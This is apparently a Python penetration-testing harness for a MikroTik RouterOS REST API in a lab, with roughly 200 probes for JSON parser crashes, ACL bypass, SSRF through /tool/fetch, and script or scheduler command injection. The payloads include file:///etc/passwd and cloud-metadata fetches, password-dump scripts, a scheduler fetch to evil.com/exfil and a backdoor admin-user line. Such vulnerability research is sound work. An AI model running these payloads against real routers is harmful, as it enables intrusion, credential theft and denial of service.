#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 — Deep REST API Novel Finding Hunter
Phase 9, Script 1 of 6
Target: [REDACTED-INTERNAL-IP]

Tests (~200):
  1. JSON parsing edge cases on all endpoints (~50)
  2. REST ACL edge cases (~40)
  3. SSRF via /rest/tool/fetch (~40)
  4. Command injection via script/scheduler (~40)
  5. Hidden/undocumented endpoints (~30)

Evidence: evidence/novel_rest_deep.json
"""

import base64
import json
import os
import re
import socket
import struct
import sys
import time
import traceback
import warnings

warnings.filterwarnings("ignore")

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/scripts')
from mikrotik_common import *

ec = EvidenceCollector("novel_rest_deep.py", phase=9)
BASE_URL = f"http://{TARGET}/rest"

# Track objects for cleanup
CLEANUP = {
    "scripts": [],
    "schedulers": [],
    "files": [],
}


# ── Helpers ──────────────────────────────────────────────────────────────────

def raw_post_bytes(path, body_bytes, headers=None, auth=None, timeout=10):
    """POST raw bytes to a REST endpoint."""
    url = f"http://{TARGET}/rest{path}"
    try:
        r = requests.post(
            url,
            headers=headers or {},
            data=body_bytes,
            auth=auth or (ADMIN_USER, ADMIN_PASS),
            timeout=timeout,
            verify=False,
        )
        try:
            return r.status_code, r.json()
        except Exception:
            return r.status_code, r.text
    except Exception as e:
        return 0, str(e)


def rest_delete(path, user=None, password=None, timeout=10):
    """DELETE a REST API resource."""
    user = user or ADMIN_USER
    password = password or ADMIN_PASS
    try:
        r = requests.delete(
            f"http://{TARGET}/rest{path}",
            auth=(user, password),
            timeout=timeout, verify=False)
        try:
            return r.status_code, r.json()
        except Exception:
            return r.status_code, r.text
    except Exception as e:
        return 0, str(e)


def track_created(obj_type, status, resp):
    """Track a created object for cleanup."""
    if status in [200, 201] and isinstance(resp, dict):
        oid = resp.get("ret") or resp.get(".id")
        if oid and obj_type in CLEANUP:
            CLEANUP[obj_type].append(oid)
            return oid
    return None


def cleanup_all():
    """Remove all objects created during testing."""
    log("Cleaning up created objects...")
    cleaned = 0
    for sid in CLEANUP["scripts"]:
        try:
            rest_delete(f"/system/script/{sid}")
            cleaned += 1
        except Exception:
            pass
    for sid in CLEANUP["schedulers"]:
        try:
            rest_delete(f"/system/scheduler/{sid}")
            cleaned += 1
        except Exception:
            pass
    for fid in CLEANUP["files"]:
        try:
            rest_delete(f"/file/{fid}")
            cleaned += 1
        except Exception:
            pass
    log(f"  Cleaned {cleaned} objects")


def periodic_health(test_count):
    """Check router health every 10 tests. Returns True if alive."""
    if test_count % 10 == 0 and test_count > 0:
        h = check_router_alive()
        if not h.get("alive"):
            log("  Router unreachable! Waiting for recovery...")
            wait_for_router(max_wait=60)
            return False
    return True


# =============================================================================
# KNOWN ENDPOINTS — gathered from Phase 3 endpoint enumeration
# =============================================================================

REST_ENDPOINTS = [
    "/system/resource", "/system/identity", "/user", "/user/group",
    "/file", "/system/script", "/system/scheduler", "/tool/fetch",
    "/ip/firewall/filter", "/ip/address", "/ip/service", "/log",
    "/certificate", "/interface", "/ip/route", "/snmp",
    "/system/package", "/ip/dns", "/ppp/secret", "/system/logging",
    "/system/clock", "/system/history", "/system/health",
    "/ip/firewall/nat", "/ip/firewall/mangle", "/ip/pool",
    "/ip/dhcp-server", "/ip/dhcp-client", "/ip/neighbor",
    "/system/note", "/system/routerboard", "/system/license",
    "/queue/simple", "/queue/tree", "/tool/bandwidth-server",
    "/tool/e-mail", "/tool/graphing", "/tool/netwatch",
    "/tool/traffic-monitor", "/user/active", "/ip/arp",
]

# Endpoints that accept POST/PUT/PATCH for mutation testing
WRITABLE_ENDPOINTS = [
    "/system/identity/set",
    "/system/script/add",
    "/system/scheduler/add",
    "/ip/address/add",
    "/ip/firewall/filter/add",
]


# =============================================================================
# Section 1: JSON Parsing Edge Cases on ALL Endpoints (~50 tests)
# =============================================================================

def test_json_edge_cases():
    """Send 5 crafted JSON payloads to every accessible REST endpoint."""
    log("=" * 60)
    log("Section 1: JSON Parsing Edge Cases on All Endpoints")
    log("=" * 60)

    test_count = 0

    # 5 crafted payloads designed to trigger parse_json_element issues
    def make_deeply_nested(depth=500):
        """Build 500-level nested JSON."""
        inner = '"deep_test_value"'
        for _ in range(depth):
            inner = '{"a":' + inner + '}'
        return inner

    def make_long_key(key_len=65536):
        """JSON with a 64KB key name."""
        key = "K" * key_len
        return '{' + f'"{key}":"value"' + '}'

    def make_mixed_array():
        """Array mixing types: string, int, null, bool, nested obj, nested array."""
        return '{"items":["string",123,null,true,{"nested":"obj"},[1,2,3]]}'

    def make_truncated_utf8():
        """JSON with truncated UTF-8 sequences (bytes that start multi-byte but end early)."""
        # \xc3 starts a 2-byte UTF-8 but we cut off the continuation byte
        raw = b'{"name":"test\xc3"}'
        return raw  # Return bytes, not string

    def make_bom_json():
        """JSON with UTF-8 BOM prefix."""
        return b'\xef\xbb\xbf{"name":"bom_test"}'

    payloads = [
        ("deeply_nested_500", make_deeply_nested(500), False),
        ("long_key_64KB", make_long_key(65536), False),
        ("mixed_type_array", make_mixed_array(), False),
        ("truncated_utf8", make_truncated_utf8(), True),  # True = already bytes
        ("bom_prefix", make_bom_json(), True),
    ]

    # Test on a subset of writable endpoints to keep count manageable
    target_endpoints = WRITABLE_ENDPOINTS[:2]  # /system/identity/set, /system/script/add

    for ep in target_endpoints:
        for payload_name, payload_data, is_bytes in payloads:
            test_count += 1
            periodic_health(test_count)

            try:
                if is_bytes:
                    body = payload_data
                else:
                    body = payload_data.encode("utf-8")

                status, resp = raw_post_bytes(
                    ep, body,
                    headers={"Content-Type": "application/json"},
                )

                is_anomaly = (status == 0 or status >= 500)

                ec.add_test(
                    "json_edge_cases",
                    f"JSON edge: {payload_name} on {ep}",
                    f"Send crafted JSON ({payload_name}) to {ep}",
                    f"HTTP {status}, resp_len={len(str(resp))}",
                    {"payload_name": payload_name, "endpoint": ep,
                     "status": status, "response": str(resp)[:500],
                     "payload_size": len(body)},
                    anomaly=is_anomaly,
                )

                if status == 0:
                    h = check_router_alive()
                    if not h.get("alive"):
                        ec.add_finding(
                            "CRITICAL",
                            f"Router crash on {payload_name} JSON at {ep}",
                            f"Sending {payload_name} JSON to {ep} caused router unresponsive",
                            cwe="CWE-674", cvss=9.8,
                        )
                        wait_for_router(max_wait=60)

                # Track scripts for cleanup
                if "script" in ep:
                    track_created("scripts", status, resp if isinstance(resp, dict) else {})

            except Exception as e:
                ec.add_test(
                    "json_edge_cases",
                    f"JSON edge: {payload_name} on {ep}",
                    f"Send crafted JSON to {ep}",
                    f"Error: {e}",
                    anomaly=True,
                )

    # Now test read endpoints with GET + JSON body (unusual but may trigger parser)
    log("  Testing GET requests with JSON body on read endpoints...")
    read_sample = REST_ENDPOINTS[:10]
    for ep in read_sample:
        for payload_name, payload_data, is_bytes in payloads[:3]:
            test_count += 1
            periodic_health(test_count)

            try:
                if is_bytes:
                    body = payload_data
                else:
                    body = payload_data.encode("utf-8")

                r = requests.get(
                    f"http://{TARGET}/rest{ep}",
                    auth=(ADMIN_USER, ADMIN_PASS),
                    headers={"Content-Type": "application/json"},
                    data=body,
                    timeout=10, verify=False,
                )
                is_anomaly = (r.status_code >= 500)
                ec.add_test(
                    "json_edge_cases",
                    f"GET+JSON: {payload_name} on {ep}",
                    f"GET {ep} with JSON body ({payload_name})",
                    f"HTTP {r.status_code}",
                    {"payload_name": payload_name, "endpoint": ep,
                     "status": r.status_code,
                     "response": r.text[:300]},
                    anomaly=is_anomaly,
                )
                if is_anomaly:
                    ec.add_finding(
                        "MEDIUM",
                        f"Server error on GET with {payload_name} JSON body at {ep}",
                        f"Sending {payload_name} JSON body with GET to {ep} returned HTTP {r.status_code}",
                        cwe="CWE-20",
                    )
            except Exception as e:
                ec.add_test(
                    "json_edge_cases",
                    f"GET+JSON: {payload_name} on {ep}",
                    f"GET with JSON body", f"Error: {e}",
                )


# =============================================================================
# Section 2: REST ACL Edge Cases (~40 tests)
# =============================================================================

def test_rest_acl_edge_cases():
    """Test permission bypass vectors on the REST API."""
    log("=" * 60)
    log("Section 2: REST ACL Edge Cases")
    log("=" * 60)

    test_count = 0
    read_user = "testread"
    read_pass = USERS["testread"]["password"]
    write_user = "testwrite"
    write_pass = USERS["testwrite"]["password"]

    # ── 2a: Read-only user access to restricted endpoints ────────────────────
    restricted_for_read = [
        ("/user", "List users"),
        ("/user/group", "List user groups"),
        ("/system/script", "List scripts"),
        ("/file", "List files"),
        ("/certificate", "List certificates"),
        ("/ip/service", "IP services"),
        ("/ppp/secret", "PPP secrets"),
        ("/system/logging", "Logging config"),
        ("/snmp/community", "SNMP communities"),
    ]

    for path, desc in restricted_for_read:
        test_count += 1
        periodic_health(test_count)

        code, data = rest_get(path, user=read_user, password=read_pass)
        accessible = code in (200, 201, 204)
        ec.add_test(
            "acl_edge", f"Read user GET {path}",
            f"Test read-only user access to {desc}",
            f"HTTP {code}, accessible={accessible}",
            {"path": path, "status": code, "accessible": accessible,
             "data_preview": str(data)[:300] if accessible else None},
            anomaly=accessible and path in ("/user", "/ppp/secret", "/certificate"),
        )
        if accessible and path in ("/user", "/ppp/secret"):
            ec.add_finding(
                "MEDIUM",
                f"Read-only user can access {path}",
                f"User '{read_user}' (group=read) can GET {path} (HTTP {code})",
                cwe="CWE-862",
            )

    # ── 2b: .proplist to leak restricted fields ──────────────────────────────
    proplist_tests = [
        ("/user?.proplist=password,name", "Attempt to extract passwords via .proplist"),
        ("/user?.proplist=*", "Wildcard proplist to show all fields"),
        ("/user?.proplist=name,group,password,comment,last-logged-in",
         "Proplist with sensitive fields"),
        ("/ip/service?.proplist=name,port,address,certificate,disabled",
         "Service config proplist"),
        ("/system/identity?.proplist=name", "Identity proplist (baseline)"),
    ]

    for path_query, desc in proplist_tests:
        test_count += 1
        periodic_health(test_count)

        # Test with admin
        try:
            r = requests.get(
                f"http://{TARGET}/rest{path_query}",
                auth=(ADMIN_USER, ADMIN_PASS),
                timeout=10, verify=False,
            )
            resp_text = r.text
            has_password = "password" in resp_text.lower() and any(
                pw in resp_text for pw in ["TestPass", "FullTest", "ReadTest", "WriteTest"]
            )

            ec.add_test(
                "acl_edge", f"Proplist admin: {path_query[:60]}",
                desc,
                f"HTTP {r.status_code}, password_leaked={has_password}",
                {"path": path_query, "status": r.status_code,
                 "response": resp_text[:500],
                 "password_in_response": has_password},
                anomaly=has_password,
            )
            if has_password:
                ec.add_finding(
                    "HIGH",
                    "Password disclosure via .proplist parameter",
                    f"GET /rest{path_query} returned password fields in response",
                    cwe="CWE-200", cvss=7.5,
                )
        except Exception as e:
            ec.add_test("acl_edge", f"Proplist: {path_query[:60]}",
                        desc, f"Error: {e}")

    # ── 2c: PATCH with read-only credentials ─────────────────────────────────
    patch_targets = [
        ("/system/identity", {"name": "Hacked_By_ReadUser"}, "Modify identity"),
        ("/ip/dns", {"servers": "[REDACTED-IP]"}, "Modify DNS"),
    ]
    for path, payload, desc in patch_targets:
        test_count += 1
        periodic_health(test_count)

        code, data = rest_patch(path, payload, user=read_user, password=read_pass)
        modified = code in (200, 201, 204)
        ec.add_test(
            "acl_edge", f"Read user PATCH {path}",
            f"Test read-only user PATCH on {desc}",
            f"HTTP {code}, modified={modified}",
            {"path": path, "status": code, "modified": modified,
             "response": str(data)[:300]},
            anomaly=modified,
        )
        if modified:
            ec.add_finding(
                "HIGH",
                f"Read-only user can PATCH {path}",
                f"User '{read_user}' modified {path} via PATCH (HTTP {code})",
                cwe="CWE-269",
            )
            # Restore
            if "identity" in path:
                rest_patch("/system/identity", {"name": "MikroTik"})

    # ── 2d: DELETE with write-only credentials ───────────────────────────────
    # Create a test object first with admin, then try to delete with write user
    code_create, resp_create = rest_post(
        "/system/script/add",
        {"name": "_acl_delete_test", "source": ":log info delete_test"},
    )
    test_script_id = None
    if code_create in [200, 201] and isinstance(resp_create, dict):
        test_script_id = resp_create.get("ret") or resp_create.get(".id")

    if test_script_id:
        code_del, resp_del = rest_delete(
            f"/system/script/{test_script_id}",
            user=write_user, password=write_pass,
        )
        deleted = code_del in (200, 204)
        ec.add_test(
            "acl_edge", "Write user DELETE script",
            "Test write-only user DELETE on /system/script",
            f"HTTP {code_del}, deleted={deleted}",
            {"status": code_del, "deleted": deleted,
             "response": str(resp_del)[:300]},
            anomaly=deleted,
        )
        if not deleted:
            CLEANUP["scripts"].append(test_script_id)
    else:
        ec.add_test("acl_edge", "Write user DELETE script",
                    "Create test object for delete test",
                    f"Setup failed: HTTP {code_create}", anomaly=True)

    # ── 2e: Access /rest/file with different users ───────────────────────────
    for username, info in USERS.items():
        test_count += 1
        code, data = rest_get("/file", user=username, password=info["password"])
        ec.add_test(
            "acl_edge", f"File access: {username} ({info['group']})",
            f"Test {info['group']} user access to /file endpoint",
            f"HTTP {code}",
            {"user": username, "group": info["group"], "status": code,
             "file_count": len(data) if isinstance(data, list) else 0,
             "data_preview": str(data)[:300]},
        )

    # ── 2f: Access admin-only operations with non-admin users ────────────────
    admin_only_ops = [
        ("/system/reboot", "POST", {}, "Reboot router"),
        ("/system/shutdown", "POST", {}, "Shutdown router"),
        ("/system/reset-configuration", "POST", {}, "Factory reset"),
        ("/system/backup/save", "POST", {}, "Create backup"),
        ("/user/add", "POST", {"name": "_acl_test_user", "password": "test", "group": "read"}, "Add user"),
    ]
    for path, method, payload, desc in admin_only_ops:
        for username in ["testread", "testwrite"]:
            test_count += 1
            periodic_health(test_count)

            info = USERS[username]
            if method == "POST":
                code, data = rest_post(path, payload, user=username, password=info["password"])
            else:
                code, data = rest_get(path, user=username, password=info["password"])

            accessible = code in (200, 201, 204)
            ec.add_test(
                "acl_edge", f"{username} {method} {path}",
                f"Test {info['group']} user {method} on {desc}",
                f"HTTP {code}, accessible={accessible}",
                {"user": username, "group": info["group"],
                 "path": path, "status": code, "accessible": accessible},
                anomaly=accessible and path not in ("/system/backup/save",),
            )
            if accessible and "reboot" in path or "shutdown" in path or "reset" in path:
                ec.add_finding(
                    "CRITICAL",
                    f"Non-admin user can {desc}",
                    f"User '{username}' ({info['group']}) can {method} {path}",
                    cwe="CWE-269", cvss=9.0,
                )


# =============================================================================
# Section 3: SSRF via /rest/tool/fetch (~40 tests)
# =============================================================================

def test_ssrf_fetch():
    """Test SSRF vectors via /rest/tool/fetch."""
    log("=" * 60)
    log("Section 3: SSRF via /rest/tool/fetch")
    log("=" * 60)

    test_count = 0

    ssrf_urls = [
        # Loopback and self-references
        ("loopback_http", "http://127.0.0.1:80/rest/system/resource"),
        ("loopback_api", "http://127.0.0.1:8728/"),
        ("loopback_winbox", "http://127.0.0.1:8291/"),
        ("self_ip", f"http://{TARGET}/rest/system/resource"),
        ("self_api", f"http://{TARGET}:8728/"),

        # File protocol
        ("file_etc_passwd", "file:///etc/passwd"),
        ("file_user_dat", "file:///rw/store/user.dat"),
        ("file_nova_etc", "file:///nova/etc/"),
        ("file_flash", "file:///flash/nova/etc/passwd"),
        ("file_rw_config", "file:///rw/"),

        # Protocol smuggling
        ("gopher_api", "gopher://127.0.0.1:8728/"),
        ("gopher_winbox", "gopher://127.0.0.1:8291/"),
        ("dict_api", "dict://127.0.0.1:8728/"),
        ("tftp_local", "tftp://127.0.0.1/test"),

        # Cloud metadata
        ("aws_metadata", "http://[REDACTED-IP]/latest/meta-data/"),
        ("aws_metadata_v2", "http://[REDACTED-IP]/latest/api/token"),
        ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/"),
        ("azure_metadata", "http://[REDACTED-IP]/metadata/instance?api-version=2021-01-01"),

        # IPv6 loopback
        ("ipv6_loopback", "http://[::1]/"),
        ("ipv6_loopback_rest", "http://[::1]:80/rest/system/resource"),

        # URL encoding evasion
        ("url_encoded_localhost", "http://%31%32%37%2e%30%2e%30%2e%31/"),
        ("hex_ip", "http://0x7f000001/"),
        ("decimal_ip", "http://2130706433/"),
        ("octal_ip", "http://0177.0.0.01/"),

        # Double URL encoding
        ("double_encoded", "http://%2531%2532%2537%252e%2530%252e%2530%252e%2531/"),

        # Redirect-based SSRF (external redirect to internal)
        ("redirect_test", "http://127.0.0.1:80/"),

        # DNS rebinding (just test if arbitrary DNS is resolved)
        ("external_dns", "http://localhost.localdomain/"),

        # FTP self
        ("ftp_self", f"ftp://{ADMIN_USER}:{ADMIN_PASS}@127.0.0.1/"),

        # URL with credentials
        ("url_with_creds", f"http://{ADMIN_USER}:{ADMIN_PASS}@127.0.0.1/rest/user"),
    ]

    for name, url in ssrf_urls:
        test_count += 1
        periodic_health(test_count)

        try:
            # Try with as-value to get response content
            code, resp = rest_post(
                "/tool/fetch",
                {"url": url, "mode": "http", "as-value": "true", "dst-path": ""},
                timeout=15,
            )

            resp_str = str(resp)
            accepted = code in [200, 201]

            # Check for actual content in response
            has_content = False
            content_indicators = ["data", "status", "root:", "/bin/", "password",
                                  "user.dat", "nova", "ami-id"]
            for indicator in content_indicators:
                if indicator in resp_str.lower():
                    has_content = True
                    break

            is_anomaly = accepted and has_content

            ec.add_test(
                "ssrf_fetch", f"SSRF: {name}",
                f"Test SSRF via /tool/fetch with URL: {url[:80]}",
                f"HTTP {code}, accepted={accepted}, has_content={has_content}",
                {"ssrf_name": name, "url": url, "status": code,
                 "response": resp_str[:800], "accepted": accepted,
                 "has_content": has_content},
                anomaly=is_anomaly,
            )

            if is_anomaly:
                severity = "CRITICAL" if "file" in name or "passwd" in resp_str else "HIGH"
                ec.add_finding(
                    severity,
                    f"SSRF via /tool/fetch — {name}",
                    f"/tool/fetch accepted URL {url} and returned content: {resp_str[:200]}",
                    cwe="CWE-918",
                    cvss=9.0 if severity == "CRITICAL" else 7.5,
                )

        except Exception as e:
            ec.add_test(
                "ssrf_fetch", f"SSRF: {name}",
                f"Test SSRF with {url[:60]}", f"Error: {e}",
            )

    # Also test if /tool/fetch can be used without authentication
    log("  Testing unauthenticated SSRF...")
    try:
        r = requests.post(
            f"http://{TARGET}/rest/tool/fetch",
            headers={"Content-Type": "application/json"},
            json={"url": "http://127.0.0.1/", "as-value": "true"},
            timeout=10, verify=False,
        )
        unauth_accepted = r.status_code in [200, 201]
        ec.add_test(
            "ssrf_fetch", "SSRF unauthenticated",
            "Test /tool/fetch without authentication",
            f"HTTP {r.status_code}, accepted={unauth_accepted}",
            {"status": r.status_code, "accepted": unauth_accepted},
            anomaly=unauth_accepted,
        )
        if unauth_accepted:
            ec.add_finding(
                "CRITICAL",
                "Unauthenticated SSRF via /tool/fetch",
                "/tool/fetch accepts requests without authentication",
                cwe="CWE-918", cvss=9.8,
            )
    except Exception as e:
        ec.add_test("ssrf_fetch", "SSRF unauthenticated",
                    "Unauthenticated SSRF test", f"Error: {e}")


# =============================================================================
# Section 4: Command Injection via Script/Scheduler (~40 tests)
# =============================================================================

def test_command_injection():
    """Test command injection via scripts and schedulers."""
    log("=" * 60)
    log("Section 4: Command Injection via Script/Scheduler")
    log("=" * 60)

    test_count = 0

    # ── 4a: Script body injection payloads ───────────────────────────────────
    script_payloads = [
        # Shell escape attempts
        ("semicolon_reboot", ':log info "safe"; /system reboot'),
        ("backtick_exec", ':log info `id`'),
        ("dollar_paren", ':log info $(id)'),
        ("pipe_cmd", ':log info "test" | id'),
        ("ampersand_chain", ':log info "test" && id'),
        ("newline_escape", ':log info "safe"\n/system reboot'),
        ("null_byte_inject", ':log info "test\x00/system reboot"'),

        # RouterOS script language abuse
        ("execute_cmd", ':execute script="/system reboot"'),
        ("execute_file", ':execute script=":put [/file get [find name=user.dat] contents]"'),
        ("resolve_cmd", ':resolve "evil.com; id"'),
        ("fetch_cmd", '/tool fetch url="http://127.0.0.1/rest/user" mode=http as-value=yes'),
        ("export_cmd", '/export file=leaked_config'),

        # Variable expansion
        ("env_var", ':put $PATH'),
        ("var_inject", ':global myvar; :set myvar [:execute "/system reboot"]; :put $myvar'),

        # System info exfiltration
        ("user_dump", ':foreach u in=[/user find] do={:put [/user get $u name]}'),
        ("password_dump", ':foreach u in=[/user find] do={:put [/user get $u password]}'),
        ("file_read", ':put [/file get [find name~"user"] contents]'),

        # Template injection
        ("format_string", ':log info "%s%s%s%s%n%n%n"'),
        ("long_string", ':log info "' + "A" * 10000 + '"'),
        ("nested_braces", ':log info "{{{{{{{{{{{{{{{{{{{{{{test}}}}}}}}}}}}}}}}}}}}}}"'),
    ]

    for name, source in script_payloads:
        test_count += 1
        periodic_health(test_count)

        script_name = f"_novel_inj_{name}"
        try:
            code, resp = rest_post(
                "/system/script/add",
                {"name": script_name, "source": source},
            )
            accepted = code in [200, 201]
            ec.add_test(
                "cmd_injection", f"Script inject: {name}",
                f"Create script with injection payload ({name})",
                f"HTTP {code}, accepted={accepted}",
                {"name": name, "source": source[:200], "status": code,
                 "accepted": accepted, "response": str(resp)[:300]},
            )
            track_created("scripts", code, resp if isinstance(resp, dict) else {})

            # If script was created, try running it
            if accepted:
                script_id = None
                if isinstance(resp, dict):
                    script_id = resp.get("ret") or resp.get(".id")

                if script_id:
                    try:
                        run_code, run_resp = rest_post(
                            f"/system/script/run",
                            {".id": script_id},
                            timeout=5,
                        )
                        ec.add_test(
                            "cmd_injection", f"Run injected: {name}",
                            f"Execute injected script ({name})",
                            f"HTTP {run_code}",
                            {"name": name, "run_status": run_code,
                             "response": str(run_resp)[:500]},
                            anomaly=(run_code in [200, 201]),
                        )
                    except Exception as e:
                        ec.add_test(
                            "cmd_injection", f"Run injected: {name}",
                            f"Execute injected script", f"Error: {e}",
                        )

        except Exception as e:
            ec.add_test(
                "cmd_injection", f"Script inject: {name}",
                f"Script injection test", f"Error: {e}",
            )

    # ── 4b: Scheduler on-event injection ─────────────────────────────────────
    scheduler_payloads = [
        ("sched_semicolon", ':log info "safe"; /system reboot'),
        ("sched_execute", ':execute script="/system reboot"'),
        ("sched_fetch", '/tool fetch url="http://evil.com/exfil" mode=http'),
        ("sched_user_add", '/user add name=backdoor password=backdoor group=full'),
        ("sched_export", '/export file=exfil_config'),
    ]

    for name, on_event in scheduler_payloads:
        test_count += 1
        periodic_health(test_count)

        sched_name = f"_novel_sched_{name}"
        try:
            code, resp = rest_post(
                "/system/scheduler/add",
                {"name": sched_name, "on-event": on_event, "interval": "99d"},
            )
            accepted = code in [200, 201]
            ec.add_test(
                "cmd_injection", f"Scheduler inject: {name}",
                f"Create scheduler with injection payload ({name})",
                f"HTTP {code}, accepted={accepted}",
                {"name": name, "on_event": on_event[:200], "status": code,
                 "accepted": accepted},
            )
            track_created("schedulers", code, resp if isinstance(resp, dict) else {})

        except Exception as e:
            ec.add_test(
                "cmd_injection", f"Scheduler inject: {name}",
                f"Scheduler injection test", f"Error: {e}",
            )

    # ── 4c: Check if any shell access exists ─────────────────────────────────
    shell_probes = [
        ("/system/ssh", "SSH service config"),
        ("/system/console", "Console access"),
        ("/tool/torch", "Torch (packet sniffer)"),
    ]
    for path, desc in shell_probes:
        test_count += 1
        code, data = rest_get(path)
        ec.add_test(
            "cmd_injection", f"Shell probe: {path}",
            f"Check for {desc} endpoint",
            f"HTTP {code}",
            {"path": path, "status": code, "data_preview": str(data)[:300]},
        )


# =============================================================================
# Section 5: Hidden/Undocumented Endpoints (~30 tests)
# =============================================================================

def test_hidden_endpoints():
    """Brute-force for hidden or undocumented REST endpoints."""
    log("=" * 60)
    log("Section 5: Hidden/Undocumented Endpoints")
    log("=" * 60)

    test_count = 0

    # ── 5a: Undocumented REST paths ──────────────────────────────────────────
    hidden_paths = [
        "/rest/nova", "/rest/debug", "/rest/test", "/rest/admin",
        "/rest/internal", "/rest/backup", "/rest/console", "/rest/shell",
        "/rest/exec", "/rest/cmd", "/rest/run", "/rest/terminal",
        "/rest/diag", "/rest/diagnostics", "/rest/status",
        "/rest/config", "/rest/settings", "/rest/setup",
        "/rest/firmware", "/rest/up[REDACTED]", "/rest/update",
        "/rest/api", "/rest/v1", "/rest/v2",
        "/rest/metrics", "/rest/monitor", "/rest/health",
        "/rest/env", "/rest/info", "/rest/version",
        "/rest/system/debug", "/rest/system/console",
        "/rest/system/terminal", "/rest/system/shell",
        "/rest/system/ssh/exec", "/rest/system/exec",
    ]

    discovered = []
    for path in hidden_paths:
        test_count += 1
        periodic_health(test_count)

        try:
            r = requests.get(
                f"http://{TARGET}{path}",
                auth=(ADMIN_USER, ADMIN_PASS),
                timeout=8, verify=False,
            )
            # Not 404 means something is there
            interesting = r.status_code not in [404, 400]
            if interesting:
                discovered.append({"path": path, "status": r.status_code,
                                   "body_preview": r.text[:300]})
            ec.add_test(
                "hidden_endpoints", f"Probe: {path}",
                f"Probe undocumented endpoint {path}",
                f"HTTP {r.status_code}",
                {"path": path, "status": r.status_code,
                 "interesting": interesting,
                 "body_preview": r.text[:300] if interesting else ""},
                anomaly=interesting and r.status_code == 200,
            )
            if r.status_code == 200:
                ec.add_finding(
                    "MEDIUM",
                    f"Undocumented endpoint discovered: {path}",
                    f"GET {path} returns HTTP 200 with content",
                    cwe="CWE-200",
                )
        except Exception as e:
            ec.add_test("hidden_endpoints", f"Probe: {path}",
                        f"Probe {path}", f"Error: {e}")

    # ── 5b: Prefix-based discovery ───────────────────────────────────────────
    prefix_paths = [
        "/_/system/resource",
        "/rest/../rest/system/resource",
        "/rest/%00/system/resource",
        "/rest/./system/resource",
        "/rest//system/resource",
        "/REST/system/resource",
        "/Rest/System/Resource",
        "/rest/system/resource/",
        "/rest/system/resource?",
        "/rest/system/resource#fragment",
    ]

    for path in prefix_paths:
        test_count += 1
        try:
            r = requests.get(
                f"http://{TARGET}{path}",
                auth=(ADMIN_USER, ADMIN_PASS),
                timeout=8, verify=False,
            )
            ec.add_test(
                "hidden_endpoints", f"Prefix: {path[:60]}",
                f"Test endpoint with unusual prefix: {path[:60]}",
                f"HTTP {r.status_code}",
                {"path": path, "status": r.status_code,
                 "body_preview": r.text[:300]},
                anomaly=(r.status_code == 200 and "/../" in path or "%00" in path),
            )
        except Exception as e:
            ec.add_test("hidden_endpoints", f"Prefix: {path[:60]}",
                        f"Prefix test", f"Error: {e}")

    # ── 5c: WebFig hidden files ──────────────────────────────────────────────
    webfig_hidden = [
        "/.git/config", "/.env", "/.htaccess", "/.htpasswd",
        "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
        "/favicon.ico", "/server-status", "/server-info",
        "/phpinfo.php", "/info.php", "/.well-known/security.txt",
        "/webfig/config.js", "/webfig/debug.js",
        "/webfig/app.config", "/winbox/",
    ]
    for path in webfig_hidden:
        test_count += 1
        try:
            r = requests.get(
                f"http://{TARGET}{path}",
                timeout=8, verify=False,
            )
            interesting = r.status_code == 200 and len(r.content) > 0
            ec.add_test(
                "hidden_endpoints", f"WebFig hidden: {path}",
                f"Probe for hidden file at {path}",
                f"HTTP {r.status_code}, size={len(r.content)}",
                {"path": path, "status": r.status_code,
                 "size": len(r.content),
                 "body_preview": r.text[:300] if interesting else ""},
                anomaly=interesting and path in ("/.env", "/.git/config", "/.htpasswd"),
            )
            if interesting and path in ("/.env", "/.git/config", "/.htpasswd"):
                ec.add_finding(
                    "HIGH",
                    f"Sensitive file exposed: {path}",
                    f"GET {path} returns HTTP 200 with {len(r.content)} bytes",
                    cwe="CWE-538",
                )
        except Exception as e:
            ec.add_test("hidden_endpoints", f"WebFig hidden: {path}",
                        f"Probe {path}", f"Error: {e}")

    # Summary of discovered endpoints
    if discovered:
        ec.add_test(
            "hidden_endpoints", "Discovery summary",
            f"Summary of {len(discovered)} non-404 undocumented endpoints",
            f"Found {len(discovered)} endpoints returning non-404",
            {"discovered": discovered},
            anomaly=len(discovered) > 3,
        )


# =============================================================================
# Main
# =============================================================================

def main():
    log("=" * 60)
    log("MikroTik RouterOS CHR 7.20.8 — Deep REST API Novel Hunting")
    log(f"Target: {TARGET}")
    log("Phase 9 — novel_rest_deep.py")
    log("=" * 60)

    # Pre-flight check
    alive = check_router_alive()
    if not alive.get("alive"):
        log("FATAL: Router is not responding. Aborting.")
        return
    log(f"Router alive: version={alive.get('version')}, uptime={alive.get('uptime')}")

    # Save original identity
    orig_status, orig_identity = rest_get("/system/identity")
    original_name = "MikroTik"
    if orig_status == 200 and isinstance(orig_identity, dict):
        original_name = orig_identity.get("name", "MikroTik")

    try:
        test_json_edge_cases()       # ~50 tests
        test_rest_acl_edge_cases()   # ~40 tests
        test_ssrf_fetch()            # ~40 tests
        test_command_injection()     # ~40 tests
        test_hidden_endpoints()      # ~30 tests

    except KeyboardInterrupt:
        log("Interrupted by user.")
    except Exception as e:
        log(f"Unhandled exception: {e}")
        traceback.print_exc()
    finally:
        log("=" * 60)
        log("Post-test cleanup")
        log("=" * 60)

        cleanup_all()

        # Restore identity
        rest_post("/system/identity/set", {"name": original_name})

        # Final health
        final = check_router_alive()
        log(f"Final health: {final}")

        ec.save("novel_rest_deep.json")
        ec.summary()


if __name__ == "__main__":
    os.chdir("/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik")
    main()
